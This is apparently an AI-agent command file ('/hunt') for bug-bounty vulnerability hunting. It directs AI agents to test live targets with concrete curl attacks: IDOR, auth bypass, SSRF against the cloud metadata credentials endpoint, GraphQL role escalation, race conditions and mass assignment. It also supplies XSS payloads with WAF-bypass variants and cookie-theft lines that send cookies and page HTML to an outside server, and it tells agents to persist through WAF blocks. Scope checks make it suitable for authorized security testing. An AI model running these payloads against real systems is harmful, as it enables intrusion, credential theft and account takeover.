---
name: hunt
description: "Active vulnerability hunting on a target. Loads scope, reads brain, detects tech stack, runs targeted tests with concrete payloads. Usage: /hunt target.com [--vuln-class idor|xss|ssrf|sqli|ssti|oauth|rce|race|graphql|upload|business-logic|llm-ai]"
disable-model-invocation: false
---
Active hunting on: $ARGUMENTS

ALL agents dispatched by this command MUST use `model: "inherit"` in the Agent tool call.

Read `rules/hunting.md` AND `rules/mistakes.md` FIRST. Both are always active.
- `rules/hunting.md` — 29 hunting rules (Rule 0 → Rule 28)
- `rules/mistakes.md` — "Top 10 Most Common Mistakes" + category rules from real engagements. Agents repeat these without the reminder (hallucinated file paths, curl vs browser, theoretical impact, CVSS mismatch, etc.).
- `rules/waf-bypass-protocol.md` — 7-level bypass ladder. If any probe returns a WAF block (403/429/challenge page), this file is mandatory reading before concluding dead end. "WAF blocks the payload" is NEVER a valid stop reason by itself — that's exactly the scenario this file exists for.
- `rules/payloads.md` — ready-to-use payloads organized by vuln class, with bypass variants for common WAFs (CF, Akamai, AWS WAF, F5, Imperva).

## Phase 1: Read Before Touching (mandatory)

1. Read scope.yaml — confirm target is in scope
2. Read brain: `uv run python3 $CLAUDE_PROJECT_DIR/tools/brain.py brief <target>` — what's tested, what's exhausted
3. Read hacktivity.md — what has been reported and paid for this program
4. `uv run python3 $CLAUDE_PROJECT_DIR/tools/scope_check.py <target>` — hard validation

## Phase 1.5: Policy Enforcement (MANDATORY)

Read `policy.md` and extract ALL actionable constraints into a policy preamble.
This preamble MUST be included in every agent dispatch from this command.

```
POLICY CONSTRAINTS (VIOLATION = DISQUALIFICATION/BAN):
SCOPE AND POLICY MUST BE OBEYED AT ALL TIMES.
[constraints extracted from policy.md]
```

Failure to include policy constraints in agent dispatches may result in
disqualification from the program or account ban.

## Phase 2: Tech Stack Detection

```bash
TARGET="<parsed from arguments>"
curl -sI https://$TARGET | grep -iE "server|x-powered-by|x-aspnet|x-runtime|x-generator"
```

Map stack → primary bug class:
- Ruby on Rails → mass assignment, IDOR
- Django → IDOR (ModelViewSet), SSTI
- Flask → SSTI, SSRF
- Express/Node → prototype pollution, path traversal
- Spring Boot → Actuator endpoints, SSTI
- Next.js → SSRF via Server Actions, open redirect
- GraphQL → introspection, IDOR via node(), auth bypass on mutations

## Phase 2.5: Auto-Select Vuln Class (autonomy-first)

If `--vuln-class` was NOT specified, generate ranked class hypotheses:

```bash
uv run python3 $CLAUDE_PROJECT_DIR/tools/intel_engine.py classes \
  --tech-stack "<detected stack + recon hints>" \
  --target <target> \
  --limit 8 \
  --output CLASS_HYPOTHESES.md
```

Use the top-ranked class first, then continue in ranked order. This ranking
combines stack signals + hacktivity ROI + brain exhaustion penalties.

## Phase 2.9: Writeup Intelligence (MANDATORY — do this BEFORE Phase 3)

Before testing ANY vuln class, search for prior art using the writeup-search MCP:

```
search_techniques "<vuln class>" — get known bypass techniques
search_writeups "<target tech stack> <vuln class>" — get relevant writeups
search_payloads "<vuln class>" — get ready-to-use payloads
```

If the writeup-search MCP is not available, read `rules/payloads.md` as fallback.

This is NOT optional — prior art saves hours and reveals techniques you wouldn't think of.
Skip this step = guaranteed duplicate or missed opportunity.

Include the writeup intelligence results in every hunter agent prompt you dispatch.
If a hunter signals a different vuln class mid-hunt:
1. Call `search_techniques` + `search_payloads` for the new class
2. Dispatch the appropriate specialized hunter with the fresh intelligence

## Phase 2.95: Autonomous Budget + Exhaustion Gates (MANDATORY)

Before dispatching classes, allocate budget:

```bash
uv run python3 $CLAUDE_PROJECT_DIR/tools/intel_engine.py budget \
  --tech-stack "<detected stack + recon hints>" \
  --target <target> \
  --total-minutes 120 \
  --total-tokens 30000 \
  --output CLASS_BUDGET.md
```

After any class is "exhausted", enforce quality:

```bash
uv run python3 $CLAUDE_PROJECT_DIR/tools/intel_engine.py exhaustion-gate \
  --attempts <N> \
  --combos-tested <N> \
  --combos-remaining <N> \
  --encoding-steps <N> \
  --differential-evidence
```

If gate fails, re-dispatch class with stricter matrix requirements.

After each class run, update telemetry:

```bash
uv run python3 $CLAUDE_PROJECT_DIR/tools/intel_engine.py record-outcome \
  --vuln-class <class> \
  --result <confirmed|killed|downgraded|partial> \
  --attempts <N> \
  --elapsed-minutes <N>
```

### Chain-anchor preamble (MANDATORY for feeder classes)

For these vuln classes — **standalone is on the never-submit list or sells low** — extract the per-class anchors from `rules/chain-table.md` "Per-Class Chain Anchors" and prepend them to the hunter dispatch prompt:

```
open-redirect, cors-hunter, info-disclosure, csrf-hunter, subdomain-takeover,
xxe-hunter, file-upload, race-condition, business-logic, privilege-escalation
```

Inject this preamble verbatim into the hunter's task:

```
CHAIN-ANCHOR DIRECTIVE — this finding class sells low/N-A standalone.

After confirming the bug, you MUST probe the following chain anchors before
declaring the finding complete (see rules/chain-table.md "Per-Class Chain
Anchors" section for full list):

[paste the 3-5 anchors for the specific class from chain-table.md]

For each anchor:
- If the anchor returns signal → label finding as CHAIN-CANDIDATE in brain
  with `--from-capability "<this finding's capability>"` and STOP. Do not
  write a single-bug report. The orchestrator will dispatch chain-builder.
- If all anchors fail → finding is informational. Apply rules/never-submit.md
  before any draft.

Single-bug reports on feeder classes burn validity ratio. The chain is the
report.
```

This forces every feeder hunter to think about chains before write-up. Hunters who skip this and file standalone feeder findings get bounced by validator.

### WAF preamble (include when any probe in Phase 2 showed a WAF signal)

If `curl -sI` in Phase 2 returned `cf-ray`, `server: cloudflare`, `x-sucuri`, `x-akamai`,
`x-datadome`, `server: awselb`, or any probe returned 403/429 with a WAF challenge page,
every hunter dispatch MUST include this preamble verbatim:

```
A WAF was detected on this target. Before declaring any vuln class "blocked":
1. Read `rules/waf-bypass-protocol.md` and `rules/payloads.md` for the WAF-specific bypasses.
2. Work through Level 1 → Level 7 of the bypass ladder. Try ≥3 payloads per level.
3. Record what gets blocked vs. what gets through (informs next level).
4. Combine levels (L1 encoding + L2 tag + L4 JS obfuscation = compound bypass).
5. Only after the full ladder is attempted AND brain records the WAF profile
   may you report "bypass exhausted". Total time budget: 20 minutes.

"WAF blocks <payload>" is NOT a dead end — it is the starting condition for this file.
Give the orchestrator the specific level/payload that passed or the full exhaustion
record. Do NOT produce a verdict of "not vulnerable — WAF blocks attempts".
```

## Phase 3: Active Testing

If `--vuln-class` specified, jump directly to that section. Otherwise, test in this order based on tech stack.

### Phase 3.1: Exhaustive Depth Protocol (mandatory)

Before declaring any endpoint "exhausted" for a vuln class, enforce every item:

1. Build a test matrix: `method × content-type × auth-state × encoding × parser-trick`. Seed with `uv run python3 $CLAUDE_PROJECT_DIR/tools/intel_engine.py matrix <class>`.
2. Run baseline controls (one known-benign + one known-malicious) to calibrate response deltas before bypass attempts.
3. Execute at least **25 attempts per endpoint / vuln-class** unless blocked by scope / policy / WAF with level-by-level evidence.
4. Include at least **8 combination tests**. Cross dimensions (encoding + method override, HPP + JSON↔form drift, parser-confusion + alt content-type) AND stack encodings within a single payload (`html-entity+url` → `%26lt%3Bscript%26gt%3B`, `double-url` → `%253Cscript%253E`, `unicode-escape+url`). WAFs typically decode once; targets decode twice.
5. Record **structural response deltas**: status, length, body marker, cache/header changes, timing. A 200 is not proof of success; a 403 is not proof of block.
6. Persist exhaustion to brain with what matrix cells were covered and what remains: `uv run python3 $CLAUDE_PROJECT_DIR/tools/brain.py record <target> recon "coverage-<class>" "<cells tested / skipped / remaining>"`.

This protocol is enforced by autopilot's Depth Engine and by Rule 24 in `rules/hunting.md`.

### IDOR Testing (highest ROI)
```bash
# Setup: need two accounts (attacker + victim)
# Log in as attacker, perform actions, note all IDs in requests
# Replay with attacker's token but victim's IDs

# Test HTTP method variations:
curl -X GET https://$TARGET/api/user/123/orders -H "Authorization: Bearer ATTACKER_TOKEN"
curl -X PUT https://$TARGET/api/user/123/orders -H "Authorization: Bearer ATTACKER_TOKEN"
curl -X DELETE https://$TARGET/api/user/123/orders -H "Authorization: Bearer ATTACKER_TOKEN"

# Test API version differences (v2 protected? try v1):
curl https://$TARGET/api/v1/user/123/data -H "Authorization: Bearer ATTACKER_TOKEN"

# Test sibling endpoints (THE SIBLING RULE):
for endpoint in export delete share archive download restore transfer admin settings; do
  curl -s -o /dev/null -w "$endpoint: %{http_code}\n" \
    "https://$TARGET/api/users/123/$endpoint" -H "Authorization: Bearer ATTACKER_TOKEN"
done

# Remove auth entirely:
curl -s "https://$TARGET/api/users/123/profile"  # no auth header
```

### Auth Bypass Testing
```bash
# Method override:
curl -X POST https://$TARGET/api/admin/users -H "X-HTTP-Method-Override: GET"
curl -X POST https://$TARGET/api/admin/users -H "X-Original-Method: GET"

# Path traversal in URL:
curl https://$TARGET/api/admin/./users
curl https://$TARGET/api/v2/../v1/admin/users

# Missing auth on siblings:
for ep in export delete share archive download; do
  curl -s -o /dev/null -w "$ep: %{http_code}" "https://$TARGET/api/users/123/$ep"
done
```

### SSRF Testing
```bash
# Find URL parameters from recon
grep -rh "url=\|uri=\|path=\|redirect=\|next=\|dest=\|webhook" recon/ 2>/dev/null | head -20

# OOB confirmation first (use interactsh or webhook.site):
curl "https://$TARGET/api/image?url=https://YOUR_OOB_SERVER"
curl "https://$TARGET/api/webhook" -d '{"url": "https://YOUR_OOB_SERVER"}'

# If DNS callback confirmed → escalate:
curl "https://$TARGET/api/image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

### GraphQL Testing
```bash
# Introspection:
curl -s -X POST https://$TARGET/graphql -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name fields { name } } } }"}'

# If introspection on → find mutations:
# Look for: createUser, deletePost, updateRole, assignAdmin
# Test auth bypass on mutations (without auth header):
curl -s -X POST https://$TARGET/graphql -H "Content-Type: application/json" \
  -d '{"query": "mutation { updateUserRole(userId: 456, role: ADMIN) { success } }"}'
```

### Race Condition Testing
```bash
# Parallel requests (using GNU parallel or curl):
# Test: coupon application, balance transfer, rate limits
seq 1 20 | xargs -P 20 -I {} curl -s "https://$TARGET/api/apply-coupon" \
  -H "Authorization: Bearer TOKEN" -d '{"code":"DISCOUNT50"}'
```

### Brain Update After Each Hunter

After each hunter agent completes:
`uv run python3 $CLAUDE_PROJECT_DIR/tools/brain.py record <target> <status> "<technique>" "<details>"`
`uv run python3 $CLAUDE_PROJECT_DIR/tools/intel_engine.py record-outcome --vuln-class "<class>" --result <confirmed|killed|downgraded|partial> --attempts <N> --elapsed-minutes <M>`

### Chain-Pressure Check (after every hunter)

The `chain_pressure_hook.py` SubagentStop hook scans `findings.json`
after every agent run and writes `.claude/agent-memory-local/chain-pending.md`
when feeder findings (open-redirect, CORS, info-disclosure, CSRF,
subdomain-takeover, XXE, file-upload, race-condition, business-logic,
privilege-escalation) are confirmed without a chain.

Read it after every hunter:
```bash
cat .claude/agent-memory-local/chain-pending.md 2>/dev/null
```

If non-empty, dispatch `chain-builder` agent for the top entry BEFORE
continuing to the next vuln class. The chain anchors live in
`rules/chain-table.md` "Per-Class Chain Anchors". A feeder without a
chain is informational; the hook is the safety net catching what the
hunter's chain-anchor preamble missed.

## Phase 4: The A→B Signal Method

When you confirm bug A, immediately check the chain table. Run /chain to find B.

## Phase 5: Document Every Lead

For each endpoint tested, record to brain:
- If finding: `uv run python3 $CLAUDE_PROJECT_DIR/tools/brain.py record <target> confirmed "<description>" "<details>"`
- If dead end: `uv run python3 $CLAUDE_PROJECT_DIR/tools/brain.py record <target> exhausted "<what failed>" "<why>"`

## Stop Signals (move on immediately)
- WAF returns 403 AND you have already worked through all 7 levels of `rules/waf-bypass-protocol.md` (≥3 payloads per level, ≥20 minutes spent) → record WAF profile in brain and rotate. Three payloads and a shrug is NOT a stop signal — that's where the protocol starts.
- 20+ payload variations from across multiple bypass levels, identical response → move on
- Finding needs 5+ simultaneous preconditions → not exploitable
- 30+ min on same endpoint with no progress (after exhausting bypass ladder) → rotate
- 20 min total with no leads → /surface to reprioritize

**Never-valid stop signals** (do not accept these in any hunter verdict):
- "WAF blocks the payload" without level-by-level evidence
- "`curl -sI` returns 403" without confirming the app layer was actually reached
- "static marketing site" without checking JS bundles, forms, `/api/*`, `/wp-json/*`, embedded widgets

### XSS Testing (use with --vuln-class xss)

#### Find Reflection Points
```bash
# Crawl for parameters
katana -u $TARGET -d 3 -jc | grep "?" | sort -u > /tmp/xss-params.txt

# Test each for reflection
while read url; do
  MARKER="xss$(date +%s)"
  resp=$(curl -s "${url}&testparam=$MARKER" 2>/dev/null)
  echo "$resp" | grep -q "$MARKER" && echo "REFLECTED: $url"
done < /tmp/xss-params.txt
```

#### Context Detection
- HTML body → `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`
- HTML attribute → `" onmouseover="alert(1)`, `' onfocus='alert(1)' autofocus='`
- JavaScript string → `';alert(1)//`, `\';alert(1)//`
- URL/href → `javascript:alert(1)`
- Template → `{{constructor.constructor('alert(1)')()}}`

#### WAF Bypass
When the WAF blocks your first 3-5 payloads, **do not conclude "not vulnerable"**.
Open `rules/waf-bypass-protocol.md` and walk the 7-level ladder end to end. The
samples below are starter payloads only — each belongs to one level of the
protocol; keep iterating within that level before giving up.
```
# Level 2 tag alternatives:
<svg/onload=alert(1)>
<details open ontoggle=alert(1)>

# Level 4 JS without blocked keywords:
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>

# Level 5 parser differentials (mutation XSS):
<iframe srcdoc="<script>alert(1)</script>">
<math><mtext><table><mglyph><style><!--</style><img src onerror=alert(1)>
```

#### Prove Impact (alert() is NOT enough — Rule 15 + Rule 28 detection-rotation ladder)
```javascript
// Cookie theft:
fetch('https://YOUR_SERVER/?c='+document.cookie)
// If HttpOnly, prove DOM access:
fetch('https://YOUR_SERVER/?url='+document.URL+'&html='+document.body.innerHTML.substr(0,500))
```

### Mass Assignment Testing (use with --vuln-class business-logic)
```bash
# Add admin/role fields to normal updates:
curl -X PUT "$TARGET/api/users/YOUR_ID" -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","role":"admin","is_admin":true,"verified":true}'

# Check if fields changed:
curl "$TARGET/api/users/YOUR_ID" -H "Authorization: Bearer TOKEN"
```

### OAuth Testing (use with --vuln-class oauth)
```bash
# Find OAuth endpoints
grep -rh "oauth\|authorize\|callback\|redirect_uri" recon/ js-analysis/ 2>/dev/null

# Test redirect_uri manipulation
# 1. Capture legitimate OAuth URL
# 2. Modify redirect_uri to your domain
# 3. Check if code is delivered to your domain
# 4. If yes → /chain for ATO

# Check PKCE enforcement:
# Send auth request WITHOUT code_challenge — if it works, PKCE bypass
```

## Report Extension Convention

When you discover additional impact that extends an already-submitted report:
1. Create `reports/drafts/COMMENT-<original-slug>.md` with the chain extension
2. NEVER edit the original submitted report draft
3. Use the COMMENT file to document:
   - What new capability was discovered
   - How it chains with the original finding
   - Updated impact and CVSS
   - New PoC steps


## Top-Tier Hunt Operator Manual

Run `/hunt` as a proof-driven loop, not a payload dump.

1. Define the target capability before testing: read another user's data, change another tenant's state, steal a token, execute code, reach internal network, or bypass a paid/admin workflow.
2. Use a 90-minute loop for each serious endpoint:
   - 10 min: stack fingerprint and route family mapping
   - 15 min: baseline controls with two accounts or two roles
   - 25 min: variant matrix across method, content type, auth state, encoding, parser, and sequence
   - 15 min: sibling endpoint replay and API version drift
   - 10 min: chain-anchor probes
   - 10 min: validation and evidence capture
   - 5 min: brain update with exact blockers
3. Kill shallow wins. A single status-code difference, reflected string, exposed version, or public config is a lead until it proves capability.
4. When a payload partially works, stop broad scanning and go deep: minimize the request, identify the parser boundary, then replay the primitive across siblings.
5. Every session ends with a ledger: confirmed, partial, exhausted, chain-pending, duplicate-risk, and next command.
